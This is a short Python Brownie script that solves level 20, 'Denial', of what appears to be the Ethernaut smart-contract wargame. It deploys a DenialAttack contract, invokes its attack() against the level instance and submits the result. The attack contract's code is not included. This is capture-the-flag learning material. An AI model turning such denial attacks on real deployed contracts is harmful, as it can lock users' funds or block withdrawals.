from brownie import web3, Denial, DenialAttack

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "20_denial"
INTERFACE_CONTRACT = Denial
INSTANCE_VALUE_WEI = web3.toWei(1, "ether")


def solve_level(level_contract):
    account = get_account()
    denial_attack = DenialAttack.deploy({"from": account})
    tx = denial_attack.attack(level_contract.address, {"from": account})


# brownie run scripts/_20_denial.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
